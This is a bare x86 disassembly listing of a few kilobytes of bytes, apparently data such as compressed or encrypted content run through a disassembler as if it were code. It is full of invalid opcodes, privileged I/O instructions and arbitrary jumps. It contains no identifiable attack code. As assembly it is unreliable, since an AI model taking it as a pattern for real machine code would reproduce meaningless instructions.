  41d8c4:	push   ecx
  41d8c5:	int    0x10
  41d8c7:	sbb    bl,BYTE PTR [ebx]
  41d8c9:	aaa    
  41d8ca:	xor    eax,0x74a6baf5
  41d8cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8d0:	popa   
  41d8d1:	leave  
  41d8d2:	xor    edi,ebx
  41d8d4:	test   BYTE PTR [edx+0x4b8ad5aa],al
  41d8da:	jbe    0x41d893
  41d8dc:	fldcw  WORD PTR [edi+esi*2-0x355aedb6]
  41d8e3:	mov    bh,0x8d
  41d8e5:	push   ds
  41d8e6:	jnp    0x41d87f
  41d8e8:	jb     0x41d8e4
  41d8ea:	push   ebx
  41d8eb:	push   es
  41d8ec:	les    ecx,FWORD PTR [esp+ebx*1+0x4355b599]
  41d8f3:	loopne 0x41d88c
  41d8f5:	outs   dx,DWORD PTR ds:[esi]
  41d8f6:	and    BYTE PTR [ebp+ebp*1-0x23bcfe29],dh
  41d8fd:	jno    0x41d8be
  41d8ff:	sbb    ah,bl
  41d901:	add    BYTE PTR [edx+0x1649e8ca],al
  41d907:	std    
  41d908:	loop   0x41d8f1
  41d90a:	hlt    
  41d90b:	aam    0x6f
  41d90d:	sbb    eax,DWORD PTR [edi]
  41d90f:	popa   
  41d910:	jnp    0x41d895
  41d912:	dec    edx
  41d913:	sahf   
  41d914:	and    al,BYTE PTR [ecx-0x1154ae39]
  41d91a:	xchg   cl,cl
  41d91c:	ins    BYTE PTR es:[edi],dx
  41d91d:	aaa    
  41d91e:	mov    dh,0x12
  41d920:	adc    esp,DWORD PTR [edx-0xa]
  41d923:	dec    esi
  41d924:	das    
  41d925:	out    0x3f,eax
  41d927:	(bad)  
  41d928:	addr16 es leave 
  41d92b:	dec    edx
  41d92c:	scas   al,BYTE PTR es:[edi]
  41d92d:	dec    edi
  41d92e:	out    0x5c,eax
  41d930:	lock loop 0x41d8c1
  41d933:	ins    BYTE PTR es:[edi],dx
  41d934:	out    0xf5,eax
  41d936:	pushf  
  41d937:	xor    BYTE PTR [ebx+0x6f],ah
  41d93a:	sub    dl,BYTE PTR [ebx+0x1555177f]
  41d940:	xor    eax,0x1dc5e124
  41d945:	imul   esp,edx,0x70
  41d948:	js     0x41d99d
  41d94a:	cmp    dl,BYTE PTR [edx]
  41d94c:	xchg   esi,eax
  41d94d:	test   eax,0xab86732d
  41d952:	lods   eax,DWORD PTR ds:[esi]
  41d953:	push   ebx
  41d954:	mov    eax,0x73d48911
  41d959:	mov    dh,0xc4
  41d95b:	cmp    DWORD PTR [edi+0x53],esi
  41d95e:	sbb    DWORD PTR [ecx+0xa],esi
  41d961:	pop    ds
  41d962:	mov    WORD PTR [eax+0xc],cs
  41d965:	pop    esi
  41d966:	inc    ecx
  41d967:	sub    BYTE PTR [ebp+0x2b],ah
  41d96a:	ret    0x5526
  41d96d:	xchg   esi,eax
  41d96e:	lods   eax,DWORD PTR ds:[esi]
  41d96f:	mov    ebp,0x8cf467a5
  41d974:	cmp    bl,BYTE PTR [edx]
  41d976:	adc    DWORD PTR [edi],ebp
  41d978:	push   ebp
  41d979:	enter  0xba7f,0x74
  41d97d:	push   0xfffffff3
  41d97f:	cwde   
  41d980:	or     esi,DWORD PTR [ecx]
  41d982:	push   0x5ad1bf92
  41d987:	aas    
  41d988:	test   BYTE PTR [ecx+0x3c],bl
  41d98b:	jb     0x41d95e
  41d98d:	popf   
  41d98e:	and    DWORD PTR [ebp-0x68],0xffffff83
  41d992:	pop    ebx
  41d993:	test   BYTE PTR [ebx],0x7a
  41d996:	fstp   QWORD PTR cs:[ebx-0x5a09e0]
  41d99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d99e:	test   esp,0xbac73677
  41d9a4:	(bad)  
  41d9a5:	stc    
  41d9a6:	sbb    eax,0x3b4e6d06
  41d9ab:	mov    al,ds:0x6302db0b
  41d9b0:	cld    
  41d9b1:	clc    
  41d9b2:	bound  edi,QWORD PTR [edi]
  41d9b4:	les    ebx,FWORD PTR [edx-0x3af2bf80]
  41d9ba:	mov    edx,0x22d406a9
  41d9bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9c0:	adc    bl,bl
  41d9c2:	mov    ah,0x9e
  41d9c4:	js     0x41da38
  41d9c6:	dec    esp
  41d9c7:	jnp    0x41d95f
  41d9c9:	and    edx,ebp
  41d9cb:	fld    DWORD PTR [ebx-0x6eafead8]
  41d9d1:	cmp    esi,edi
  41d9d3:	xchg   edi,eax
  41d9d4:	inc    eax
  41d9d5:	ja     0x41d9a0
  41d9d7:	adc    ah,ah
  41d9d9:	xchg   edx,eax
  41d9da:	fild   DWORD PTR [edx-0x3]
  41d9dd:	sti    
  41d9de:	mov    eax,ds:0xa886c691
  41d9e3:	popf   
  41d9e4:	or     ch,BYTE PTR [eax+0x66]
  41d9e7:	ret    
  41d9e8:	hlt    
  41d9e9:	mov    ebp,0x6358fb20
  41d9ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9ef:	arpl   WORD PTR [eax-0x399cf831],di
  41d9f5:	pushf  
  41d9f6:	cmp    edx,0x442bb600
  41d9fc:	xchg   ebp,eax
  41d9fd:	mov    edx,0xc0f2b0e3
  41da02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da03:	int    0xd9
  41da05:	sbb    BYTE PTR [ebp+0x7e],0xdf
  41da09:	ja     0x41d9bc
  41da0b:	aad    0xa1
  41da0d:	sar    DWORD PTR [ebp-0x57],1
  41da10:	gs jl  0x41da36
  41da13:	dec    ebx
  41da14:	push   0x9bf98b4
  41da19:	ja     0x41d9eb
  41da1b:	pop    ds
  41da1c:	inc    ebp
  41da1d:	jns    0x41d9da
  41da1f:	jmp    0x41da6d
  41da21:	push   esp
  41da22:	inc    esi
  41da23:	mov    esi,0xbea36ddf
  41da28:	add    eax,0x3c74acbe
  41da2d:	push   ss
  41da2e:	sub    bh,dl
  41da30:	ds sahf 
  41da32:	cmp    edx,DWORD PTR [ebp+0x0]
  41da35:	dec    ebx
  41da36:	pusha  
  41da37:	jne    0x41da10
  41da39:	xor    DWORD PTR [edx+0x176cbf79],0xffffffa4
  41da40:	loope  0x41da7f
  41da42:	jge    0x41da4d
  41da44:	mov    esi,0x139f4b28
  41da49:	lods   al,BYTE PTR ds:[esi]
  41da4a:	mov    eax,0x5546e7be
  41da4f:	(bad)  [ebx+0x3d]
  41da52:	dec    eax
  41da53:	inc    edi
  41da54:	fwait
  41da55:	scas   eax,DWORD PTR es:[edi]
  41da56:	push   0x32
  41da58:	jae    0x41da77
  41da5a:	cmp    bh,BYTE PTR ds:0xa040b545
  41da60:	leave  
  41da61:	outs   dx,DWORD PTR ds:[esi]
  41da62:	repz mov ebx,0xa943cec5
  41da68:	jne    0x41d9ea
  41da6a:	mov    gs,ebp
  41da6c:	js     0x41daab
  41da6e:	sbb    DWORD PTR [esi],edi
  41da70:	fs push edx
  41da72:	adc    al,0xa4
  41da74:	sub    esi,ebp
  41da76:	push   esp
  41da77:	out    dx,eax
  41da78:	fwait
  41da79:	imul   edi,edx,0x96e986f4
  41da7f:	cs and eax,0xd17b0f12
  41da85:	adc    BYTE PTR [eax],0xe6
  41da88:	mov    bh,0x97
  41da8a:	mov    al,0x83
  41da8c:	adc    DWORD PTR ds:0x200649ae,ecx
  41da92:	xchg   ecx,eax
  41da93:	cwde   
  41da94:	ins    BYTE PTR es:[edi],dx
  41da95:	retf   
  41da96:	mov    edx,0xfc6e83bb
  41da9b:	jae    0x41dab2
  41da9d:	xchg   esp,eax
  41da9e:	clc    
  41da9f:	mov    al,ds:0x89705c6e
  41daa4:	cmp    DWORD PTR [eax-0x6d5eb5d6],0x6496fe78
  41daae:	jns    0x41dac9
  41dab0:	rcl    ebx,0x75
  41dab3:	repz mov ?,WORD PTR [eax+0x51]
  41dab7:	mov    esi,0x626092e1
  41dabc:	out    0x73,al
  41dabe:	(bad)  [ecx]
  41dac0:	sbb    cl,BYTE PTR [eax]
  41dac2:	mov    ds:0x27bbf03a,al
  41dac7:	or     ch,bh
  41dac9:	inc    esi
  41daca:	adc    ah,BYTE PTR [ebp-0x26178f18]
  41dad0:	jge    0x41da84
  41dad2:	shr    BYTE PTR [ebx+ecx*1],cl
  41dad5:	bound  esi,QWORD PTR [eax+0x3d30d589]
  41dadb:	(bad)  [esi]
  41dadd:	or     eax,0x59c80071
  41dae2:	outs   dx,DWORD PTR ds:[esi]
  41dae3:	mov    ebp,0xbf621b17
  41dae8:	and    ch,BYTE PTR [esi-0x261c07b0]
  41daee:	inc    ecx
  41daef:	sub    edi,esi
  41daf1:	rol    BYTE PTR [edi-0x450610d3],0xa1
  41daf8:	pop    es
  41daf9:	mov    WORD PTR [esi],es
  41dafb:	pop    ss
  41dafc:	xchg   edx,ecx
  41dafe:	dec    edi
  41daff:	push   0xffffffbe
  41db01:	(bad)  
  41db02:	fisttp QWORD PTR [edi-0xb]
  41db05:	(bad)  
  41db06:	rcl    DWORD PTR ds:0xb5e49ec7,cl
  41db0c:	std    
  41db0d:	jge    0x41db80
  41db0f:	cmp    eax,0x877379b8
  41db14:	(bad)  
  41db15:	idiv   BYTE PTR [eax-0x72]
  41db18:	les    edi,FWORD PTR [ebp-0x7c9db6e2]
  41db1e:	jne    0x41db7e
  41db20:	xlat   BYTE PTR ds:[ebx]
  41db21:	push   edx
  41db22:	js     0x41db01
  41db24:	(bad)  
  41db25:	(bad)  
  41db26:	or     ebp,DWORD PTR ds:[esi+edx*4]
  41db2a:	(bad)  
  41db2c:	pop    ss
  41db2d:	and    bh,dl
  41db2f:	test   al,0x2
  41db31:	rol    DWORD PTR [edx-0x19a5ab8f],0x31
  41db38:	lea    edx,cs:[esi+0x28]
  41db3c:	and    BYTE PTR [esi],0x56
  41db3f:	(bad)  
  41db40:	imul   ebp,DWORD PTR [ebp+0x5c],0x947dff69
  41db47:	cld    
  41db48:	cmp    esi,0xffffff8e
  41db4b:	out    dx,eax
  41db4c:	or     BYTE PTR [edx-0x180cc4ec],bl
  41db52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db53:	cwde   
  41db54:	push   ebp
  41db55:	call   0x7e20:0x6699c103
  41db5c:	aam    0x2c
  41db5e:	jmp    0x41db50
  41db60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db61:	xchg   ecx,eax
  41db62:	inc    edx
  41db63:	loope  0x41daff
  41db65:	cmp    DWORD PTR [esi-0x192d0d5],edi
  41db6b:	inc    ebp
  41db6c:	sbb    eax,0xbc212652
  41db71:	ret    
  41db72:	jae    0x41db1f
  41db74:	xor    al,0x29
  41db76:	repnz dec edi
  41db78:	sub    DWORD PTR [ecx-0x3d407ad7],esi
  41db7e:	ror    BYTE PTR [eax],cl
  41db80:	cmp    al,0xc1
  41db82:	pop    edi
  41db83:	sti    
  41db84:	(bad)  
  41db85:	push   0x2e
  41db87:	and    eax,0x27db2ff1
  41db8c:	bound  edi,QWORD PTR [edi+0x18]
  41db8f:	mov    dl,0x38
  41db91:	(bad)  
  41db92:	sbb    eax,0xbe4cbbda
  41db97:	sti    
  41db98:	mov    DWORD PTR [ecx],eax
  41db9a:	sbb    BYTE PTR [edi-0x64],ch
  41db9d:	adc    al,0xe7
  41db9f:	popa   
  41dba0:	shr    edi,0xbb
  41dba3:	popf   
  41dba4:	int    0x56
  41dba6:	add    DWORD PTR [eax],ebx
  41dba8:	fsub   DWORD PTR [ebx]
  41dbaa:	pop    esp
  41dbab:	sbb    al,0x70
  41dbad:	std    
  41dbae:	or     al,0x1f
  41dbb0:	jbe    0x41db34
  41dbb2:	sub    DWORD PTR [eax-0x56],ebp
  41dbb5:	inc    ecx
  41dbb6:	pop    es
  41dbb7:	enter  0xb2ab,0x1f
  41dbbb:	push   cs
  41dbbc:	inc    eax
  41dbbd:	sbb    BYTE PTR [ebp-0x6c],ch
  41dbc0:	(bad)  
  41dbc1:	push   ss
  41dbc2:	add    al,0x43
  41dbc4:	adc    DWORD PTR [edi],ebx
  41dbc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbc7:	aam    0x75
  41dbc9:	clc    
  41dbca:	xchg   ebp,eax
  41dbcb:	out    0xe3,eax
  41dbcd:	cdq    
  41dbce:	or     BYTE PTR [eax],dh
  41dbd0:	repnz add eax,0x1985ef7b
  41dbd6:	retf   0x3d5b
  41dbd9:	jns    0x41dbbc
  41dbdb:	int    0xf
  41dbdd:	add    eax,0xe33e3897
  41dbe2:	cmp    BYTE PTR [ecx],dh
  41dbe4:	pop    ebp
  41dbe5:	push   ss
  41dbe6:	scas   eax,DWORD PTR es:[edi]
  41dbe7:	lods   al,BYTE PTR ds:[esi]
  41dbe8:	(bad)  
  41dbe9:	fsubr  DWORD PTR [ecx]
  41dbeb:	sbb    al,0x5f
  41dbed:	sbb    edi,DWORD PTR [ebp+0x391f196b]
  41dbf3:	lds    eax,FWORD PTR [eax+0x29c42679]
  41dbf9:	push   es
  41dbfa:	mov    ebx,0xc9549e46
  41dbff:	pushf  
  41dc00:	dec    edx
  41dc01:	test   dl,dh
  41dc03:	pop    ebp
  41dc04:	or     eax,0xca7fbed7
  41dc09:	mov    dh,0x3d
  41dc0b:	cld    
  41dc0c:	sbb    BYTE PTR ds:0x4880e015,0x71
  41dc13:	xlat   BYTE PTR ds:[ebx]
  41dc14:	outs   dx,DWORD PTR ds:[esi]
  41dc15:	sbb    ch,ah
  41dc17:	pop    edi
  41dc18:	xchg   DWORD PTR [ecx],esi
  41dc1a:	push   eax
  41dc1b:	fcom   QWORD PTR [ebp-0x62]
  41dc1e:	js     0x41dbda
  41dc20:	cmp    DWORD PTR [ebp-0x21d45010],0xd2dde4b2
  41dc2a:	sub    bl,0x3d
  41dc2d:	mov    edi,DWORD PTR [ecx+0x5]
  41dc30:	mov    bl,0xce
  41dc32:	or     eax,0xde58041f
  41dc37:	stc    
  41dc38:	jae    0x41dc39
  41dc3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc3b:	daa    
  41dc3c:	mov    edx,0xbfe482c7
  41dc41:	call   0xfdda7afb
  41dc46:	ret    
  41dc47:	shr    BYTE PTR [eax-0x72],0x75
  41dc4b:	retf   0xa3b9
  41dc4e:	bound  edi,QWORD PTR [esi+0x72]
  41dc51:	test   al,0xe8
  41dc53:	xor    BYTE PTR [ebx],0xfe
  41dc56:	jne    0x41dc0b
  41dc58:	inc    edi
  41dc59:	out    0x5f,eax
  41dc5b:	mov    edx,0x1cf0c7d3
  41dc60:	or     eax,0xd5049fe8
  41dc65:	pop    esp
  41dc66:	add    esi,DWORD PTR [ebx]
  41dc68:	xor    BYTE PTR [ecx],cl
  41dc6a:	xchg   DWORD PTR [ebx+0x43b7ffb5],edi
  41dc70:	adc    al,0xf5
  41dc72:	loop   0x41dc62
  41dc74:	(bad)  
  41dc75:	pop    esi
  41dc76:	mov    esi,0x72fc8f8
  41dc7b:	lea    esi,[eax+0x2e998c03]
  41dc81:	mov    ?,WORD PTR [edx]
  41dc83:	inc    ebx
  41dc84:	add    eax,esp
  41dc86:	aaa    
  41dc87:	xor    eax,0xdd74fb60
  41dc8c:	xlat   BYTE PTR ds:[ebx]
  41dc8e:	stos   BYTE PTR es:[edi],al
  41dc8f:	pop    ecx
  41dc90:	fiadd  WORD PTR [edx+0x47]
  41dc93:	cmp    al,BYTE PTR [edx+esi*8+0x676c0224]
  41dc9a:	mov    al,cl
  41dc9c:	sub    eax,DWORD PTR [eax+0x1ce0a67]
  41dca2:	dec    eax
  41dca3:	sti    
  41dca4:	arpl   WORD PTR [esi+0x37],dx
  41dca7:	xor    al,0xfe
  41dca9:	aam    0xe8
  41dcab:	retf   0x3fb8
  41dcae:	add    edi,ecx
  41dcb0:	lds    eax,FWORD PTR [ebp-0x4d]
  41dcb3:	pop    ss
  41dcb4:	or     al,0x70
  41dcb6:	fdivr  QWORD PTR [ebx+0x62]
  41dcb9:	mov    esp,0xf49befc8
  41dcbe:	inc    edx
  41dcbf:	and    esp,esp
  41dcc1:	or     eax,0x1a112579
  41dcc6:	and    edx,DWORD PTR [ecx-0x4b]
  41dcc9:	jae    0x41dc7d
  41dccb:	dec    edi
  41dccc:	js     0x41dc8f
  41dcce:	std    
  41dccf:	or     ebx,DWORD PTR [esi-0x5d033d84]
  41dcd5:	imul   esp,ebp,0xffffffeb
  41dcd8:	pop    ss
  41dcd9:	pop    esp
  41dcda:	push   esp
  41dcdb:	dec    esp
  41dcdc:	sti    
  41dcdd:	stos   DWORD PTR es:[edi],eax
  41dcde:	inc    esp
  41dcdf:	stc    
  41dce0:	jae    0x41dd16
  41dce2:	mov    BYTE PTR [edx],0xc4
  41dce5:	fwait
  41dce6:	inc    eax
  41dce7:	sub    eax,0xcd4fa22d
  41dcec:	mov    ebp,0x186c8af7
  41dcf1:	xchg   DWORD PTR [edi-0x2b],esp
  41dcf4:	retf   0x97c
  41dcf7:	ins    BYTE PTR es:[edi],dx
  41dcf8:	cmp    bl,BYTE PTR [ebx+0x19061ed4]
  41dcfe:	push   edi
  41dcff:	mov    esp,0xbca9fda1
  41dd04:	aaa    
  41dd05:	or     ebx,0xf33419f3
  41dd0b:	xchg   esi,eax
  41dd0c:	adc    dh,ah
  41dd0e:	add    ebx,eax
  41dd10:	adc    bh,BYTE PTR [edi+0x4d]
  41dd13:	icebp  
  41dd14:	ret    
  41dd15:	sub    bl,BYTE PTR [eax]
  41dd17:	jl     0x41dd71
  41dd19:	(bad)  
  41dd1a:	test   al,0x27
  41dd1c:	add    ah,BYTE PTR [ecx]
  41dd1e:	mov    cl,0x7
  41dd20:	add    ah,BYTE PTR [ebp+0x7161b70]
  41dd26:	add    ch,BYTE PTR [ebx]
  41dd28:	cmp    esi,DWORD PTR [esi+0x71]
  41dd2b:	dec    ebx
  41dd2c:	pop    esi
  41dd2d:	lods   al,BYTE PTR ds:[esi]
  41dd2e:	std    
  41dd2f:	or     al,0x76
  41dd31:	jnp    0x41dcf0
  41dd33:	inc    edx
  41dd34:	arpl   WORD PTR [ecx+0x67573ae],ax
  41dd3a:	out    0xda,eax
  41dd3c:	aas    
  41dd3d:	jne    0x41dcc1
  41dd3f:	push   ss
  41dd40:	lods   eax,DWORD PTR ds:[esi]
  41dd41:	cdq    
  41dd42:	xchg   ebx,eax
  41dd43:	pop    edx
  41dd44:	dec    esi
  41dd45:	aaa    
  41dd46:	cmc    
  41dd47:	dec    edx
  41dd48:	mov    ecx,0xd0a9e3d6
  41dd4d:	sbb    eax,0xe9726edb
  41dd52:	pop    esp
  41dd53:	mov    edx,0xfab59088
  41dd58:	test   al,0x6a
  41dd5a:	gs sti 
  41dd5c:	sub    dl,0x5d
  41dd5f:	ins    DWORD PTR es:[edi],dx
  41dd60:	mov    ch,0xfc
  41dd63:	aam    0xf1
  41dd65:	stos   DWORD PTR es:[edi],eax
  41dd66:	add    DWORD PTR ds:0x7512d58e,ecx
  41dd6c:	push   eax
  41dd6d:	data16 adc al,0xdc
  41dd70:	outs   dx,BYTE PTR ds:[esi]
  41dd71:	or     eax,0x9d6e9923
  41dd76:	xor    BYTE PTR [ecx+0x55],dl
  41dd79:	ss mov bl,0x3f
  41dd7c:	dec    esi
  41dd7d:	stos   DWORD PTR es:[edi],eax
  41dd7e:	leave  
  41dd7f:	sti    
  41dd80:	in     eax,dx
  41dd81:	push   es
  41dd82:	pop    esp
  41dd83:	retf   
  41dd84:	push   eax
  41dd85:	fdivr  DWORD PTR [eax]
  41dd87:	stos   DWORD PTR es:[edi],eax
  41dd88:	or     BYTE PTR [esi],dl
  41dd8a:	fsubr  DWORD PTR [esi+0x6f]
  41dd8d:	scas   eax,DWORD PTR es:[edi]
  41dd8e:	or     cl,BYTE PTR [esi-0x21]
  41dd91:	mov    DWORD PTR [ebx+0x10],edi
  41dd94:	jle    0x41dd30
  41dd96:	jb     0x41ddb2
  41dd98:	mov    bl,0x21
  41dd9a:	jmp    FWORD PTR [eax]
  41dd9c:	jnp    0x41dd50
  41dd9e:	in     al,0x53
  41dda0:	shr    DWORD PTR [edi-0x24cf9f5a],0xea
  41dda7:	mov    bl,0x8f
  41dda9:	jp     0x41de27
  41ddab:	and    edx,DWORD PTR [ebx+0x174a603f]
  41ddb1:	mov    bh,0xd8
  41ddb3:	jl     0x41de1e
  41ddb5:	(bad)  
  41ddb6:	sbb    eax,DWORD PTR [edi-0x68]
  41ddb9:	imul   DWORD PTR [eax-0x5d53fd59]
  41ddbf:	int    0xc8
  41ddc1:	xlat   BYTE PTR ds:[ebx]
  41ddc2:	iret   
  41ddc3:	xor    ebp,DWORD PTR [eax-0x597acc91]
  41ddc9:	dec    ebp
  41ddca:	xor    DWORD PTR [ebp+esi*1+0x1bbb0e1b],0xfc810d89
  41ddd5:	or     DWORD PTR [ecx],edx
  41ddd7:	arpl   WORD PTR [ebp+0x102a34ff],sp
  41dddd:	push   ecx
  41ddde:	cmp    DWORD PTR [esp+edx*2-0x2f180973],eax
  41dde5:	inc    edx
  41dde6:	push   ebx
  41dde7:	inc    ebx
  41dde8:	bound  eax,QWORD PTR [esi]
  41ddea:	fimul  WORD PTR [ebx+0x19d886d5]
  41ddf0:	fdiv   st(2),st
  41ddf2:	sbb    BYTE PTR [edi],dl
  41ddf4:	inc    ebp
  41ddf5:	adc    DWORD PTR [ebx+0x3e9a1b52],esi
  41ddfb:	out    dx,eax
  41ddfc:	cmp    cl,BYTE PTR [edi+0xe867f1c]
  41de02:	jne    0x41dddf
  41de04:	cmp    eax,0x660a3983
  41de09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de0a:	int3   
  41de0b:	push   eax
  41de0c:	mov    ?,WORD PTR [edx+0x3f]
  41de0f:	mov    fs,WORD PTR [ebx-0x1c8de0da]
  41de15:	and    BYTE PTR [edx],0xed
  41de18:	shr    BYTE PTR [eax+0x3c],1
  41de1b:	repnz in eax,dx
  41de1d:	js     0x41de8e
  41de1f:	push   ecx
  41de20:	in     al,dx
  41de21:	jno    0x41de4a
  41de23:	add    ah,BYTE PTR [ebp-0x5b]
  41de26:	pushf  
  41de27:	fiadd  DWORD PTR [ecx+eax*4+0xe332a54]
  41de2e:	push   esi
  41de2f:	aad    0x5c
  41de31:	es mov edi,0x246788c1
  41de37:	and    ecx,DWORD PTR [esi-0x5b7575e8]
  41de3d:	jbe    0x41de54
  41de3f:	fiadd  DWORD PTR [ebp+0x2e1da310]
  41de45:	pop    edx
  41de46:	cmp    eax,0x421766de
  41de4b:	jns    0x41de77
  41de4d:	push   ecx
  41de4e:	push   eax
  41de4f:	pop    ss
  41de50:	imul   ebx,DWORD PTR [eax+0x79],0xffffffe2
  41de54:	sbb    ebx,esp
  41de56:	cmp    dh,bl
  41de58:	arpl   WORD PTR [eax+0x58ee2d2e],bx
  41de5e:	pop    ebx
  41de5f:	add    eax,0xa4012478
  41de64:	sub    eax,0x4ebf547d
  41de69:	dec    eax
  41de6a:	push   cs
  41de6b:	pop    es
  41de6c:	xchg   DWORD PTR [esi-0x34afc965],ebp
  41de72:	mov    dh,0xa5
  41de74:	push   0x1b
  41de76:	iret   
  41de77:	jp     0x41ddfe
  41de79:	js     0x41de6d
  41de7b:	lahf   
  41de7c:	test   BYTE PTR [ebp-0x7d],cl
  41de7f:	cmp    DWORD PTR [ecx+ebp*4-0x606f2817],ebx
  41de86:	jno    0x41dee4
  41de88:	adc    DWORD PTR [ecx+esi*8+0x12],edx
  41de8c:	sti    
  41de8d:	cmp    eax,0x3521d3da
  41de92:	xor    ecx,DWORD PTR [ebx-0x6a5542e]
  41de98:	mov    BYTE PTR [edi-0x44],0x71
  41de9c:	cmp    dl,BYTE PTR [ecx+0x57efc2c]
  41dea2:	aad    0x94
  41dea4:	sbb    bl,BYTE PTR ds:0xe616d688
  41deaa:	pop    ecx
  41deab:	shr    DWORD PTR [ebx],cl
  41dead:	adc    eax,0x2a4a64ce
  41deb2:	mov    BYTE PTR [esi+0x10],ch
  41deb5:	sub    al,0x4c
  41deb7:	xor    edx,edx
  41deb9:	cld    
  41deba:	fisubr WORD PTR [ebx]
  41debc:	push   ecx
  41debd:	sti    
  41debe:	pop    ebx
  41debf:	iret   
  41dec0:	jae    0x41deb1
  41dec2:	cmp    DWORD PTR [ebp-0x4a5fb7d],ebp
  41dec8:	jno    0x41deab
  41deca:	add    BYTE PTR [edx+0x6f],bl
  41decd:	jg     0x41df12
  41decf:	adc    al,0x80
  41ded1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ded2:	jne    0x41df27
  41ded4:	jg     0x41df05
  41ded6:	ss jp  0x41dea5
  41ded9:	das    
  41deda:	fnstcw WORD PTR [eax+esi*8-0x789bfd0f]
  41dee1:	xchg   edx,eax
  41dee2:	and    BYTE PTR [ebx+0x5681c375],bl
  41dee8:	loope  0x41df5f
  41deea:	or     DWORD PTR [esi+0x20],edi
  41deed:	ins    DWORD PTR es:[edi],dx
  41deee:	icebp  
  41deef:	into   
  41def0:	mov    ebx,0x7637d505
  41def5:	xor    al,0x18
  41def7:	mov    edx,DWORD PTR [ebx-0x2]
  41defa:	jno    0x41df05
  41defc:	mov    ebx,DWORD PTR [ebx+0x67ede582]
  41df02:	aam    0x48
  41df04:	std    
  41df05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df06:	cmp    ebp,0x1f3eacc6
  41df0c:	and    dl,bh
  41df0e:	add    BYTE PTR [edi+0x3b],dl
  41df11:	iret   
  41df12:	or     al,0x78
  41df14:	shl    ebx,1
  41df16:	in     eax,dx
  41df17:	pop    eax
  41df18:	imul   esi,DWORD PTR [esi],0x95149f82
  41df1e:	mul    BYTE PTR [eax+0x40]
  41df21:	out    dx,al
  41df22:	pop    edi
  41df23:	push   cs
  41df24:	cdq    
  41df25:	push   ebp
  41df26:	sub    al,0x61
  41df28:	mov    eax,ds:0x4fc21482
  41df2d:	xor    eax,0x7088a54b
  41df32:	mov    ecx,0xcd79c97e
  41df37:	idiv   bh
  41df39:	in     eax,dx
  41df3a:	aaa    
  41df3b:	inc    edx
  41df3c:	add    ah,BYTE PTR [edi+0x144c48ba]
  41df42:	nop
  41df43:	adc    ebp,ebx
  41df45:	cmp    dh,BYTE PTR [ecx+0x6f]
  41df48:	fmul   DWORD PTR [ebx]
  41df4a:	cmp    ah,cl
  41df4c:	mov    ch,0xe6
  41df4e:	or     cl,BYTE PTR [esi-0x1b]
  41df51:	aaa    
  41df52:	adc    cl,BYTE PTR [ebx+ebx*8+0x4fb403d1]
  41df59:	mov    esi,0xb884d3a9
  41df5e:	xchg   edx,eax
  41df5f:	cmp    eax,0x52c368f0
  41df64:	pop    es
  41df65:	sti    
  41df66:	outs   dx,BYTE PTR ds:[esi]
  41df67:	cwde   
  41df68:	cdq    
  41df69:	sub    eax,0x56c7abf3
  41df6e:	sbb    al,0x82
  41df70:	fsubp  st(4),st
  41df72:	or     DWORD PTR [ebx-0x6a],edx
  41df75:	fcmovnu st,st(0)
  41df77:	mov    ds:0x5b9fc94f,al
  41df7c:	jnp    0x41df1e
  41df7e:	aad    0xfd
  41df80:	add    eax,0x9bac5b80
  41df85:	ret    0xe9a8
  41df88:	adc    ah,BYTE PTR [edi]
  41df8a:	in     eax,0xea
  41df8c:	fs aaa 
  41df8e:	out    0x2e,eax
  41df90:	mov    ds:0xab287feb,eax
  41df95:	call   0xbe9:0xf621da28
  41df9c:	sub    BYTE PTR [eax],al
  41df9e:	idiv   DWORD PTR [ebx+edi*8+0x7e91bd86]
  41dfa5:	data16 mov bl,0x3c
  41dfa8:	repnz lahf 
  41dfaa:	in     eax,dx
  41dfab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfac:	cmp    al,0xfd
  41dfae:	(bad)  
  41dfaf:	fcmove st,st(4)
  41dfb1:	out    dx,eax
  41dfb2:	mov    cl,0xfe
  41dfb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfb5:	mov    ds:0x481d941,al
  41dfba:	jge    0x41df7a
  41dfbc:	pop    ecx
  41dfbd:	loope  0x41e03d
  41dfbf:	aas    
  41dfc0:	stc    
  41dfc1:	into   
  41dfc2:	test   al,0xc1
  41dfc4:	pop    ebp
  41dfc5:	mov    esi,0xa80093a
  41dfca:	xor    DWORD PTR [esp+edx*8-0x2c527557],edi
  41dfd1:	daa    
  41dfd2:	mov    al,ds:0xb52a992b
  41dfd7:	jns    0x41df91
  41dfd9:	jnp    0x41df5d
  41dfdb:	jmp    0x1646711c
  41dfe0:	xchg   BYTE PTR [edx-0x56711b60],bl
  41dfe6:	jmp    0x85f:0xbe805db6
  41dfed:	out    dx,eax
  41dfee:	push   esi
  41dfef:	sub    ebp,DWORD PTR [esi]
  41dff1:	mov    ah,0xdb
  41dff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dff4:	mov    ebx,0xe207ae5
  41dff9:	out    0x7a,eax
  41dffb:	ss imul edx,edi,0x94e503b4
  41e002:	sbb    eax,0x6729fbc7
  41e007:	imul   eax,DWORD PTR [ebx],0x6f88242
  41e00d:	inc    edx
  41e00e:	aas    
  41e00f:	sub    ah,dl
  41e011:	jle    0x41e03e
  41e013:	and    BYTE PTR [eax-0x48252730],ch
  41e019:	stc    
  41e01a:	push   0xffffffe2
  41e01c:	mov    eax,ds:0x4d679fa1
  41e021:	enter  0x319,0xb1
  41e025:	pop    es
  41e026:	pop    edi
  41e027:	xor    bl,ch
  41e029:	fcmovnbe st,st(2)
  41e02c:	ss jo  0x41dfc8
  41e02f:	(bad)  
  41e030:	add    ebp,DWORD PTR [edx+eax*8]
  41e033:	fwait
  41e034:	sub    eax,DWORD PTR [ebx]
